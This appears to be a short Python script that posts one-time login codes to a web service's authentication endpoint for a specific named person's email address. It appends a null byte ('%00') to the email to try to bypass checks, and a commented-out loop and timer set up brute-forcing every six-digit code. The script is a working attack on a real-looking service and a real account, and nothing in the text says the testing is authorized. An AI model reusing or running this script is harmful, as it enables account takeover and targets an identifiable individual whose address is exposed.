import requests as r
import time

def start():
    sess = r.Session()
    # data = {
    #     "email": "edgars.grigors@mapon.com"
    # }
    # sess.post("https://app.hex.lv/api/auth/req-code", data=data)

    # s_t = time.time()

    codes = (123456, 623152, "061085")
    # for x in range(100000, 999999):
    #     pass
    for code in codes:
        data = {
            "code": code,
            "email": "edgars.grigors@mapon.com%00"
        }
        req = sess.post("https://app.hex.lv/api/auth/req-code", data=data)
        print(req.status_code)
    # e_t = time.time() - s_t
    # print(e_t)

if __name__ == "__main__":
    start()